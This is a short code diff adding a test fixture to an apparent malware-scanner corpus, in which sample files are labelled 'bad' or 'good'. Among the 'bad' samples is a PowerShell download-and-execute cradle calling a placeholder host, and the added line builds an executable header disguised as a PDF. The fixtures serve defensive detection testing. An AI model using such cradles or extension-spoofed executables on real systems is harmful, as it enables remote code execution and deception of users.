@@ -28,6 +28,7 @@ def build_corpus(root: Path) -> list[tuple[Path, str]]:
         ("loader.ps1",
          "New-Object Net.WebClient; IEX(x.DownloadString('http://x/y'))", "bad"),
         ("packed.exe", __import__("os").urandom(40000), "bad"),
+        ("statement.pdf", b"MZ\x90\x00" + b"\x00" * 256, "bad"),  # PE spoofing a .pdf
         # ── benign (label: good) ──────────────────────────────────────────
         ("notes.txt", "shopping list: milk, bread, coffee", "good"),
         ("script.sh", "#!/bin/sh\necho 'building project'\nmake all\n", "good"),
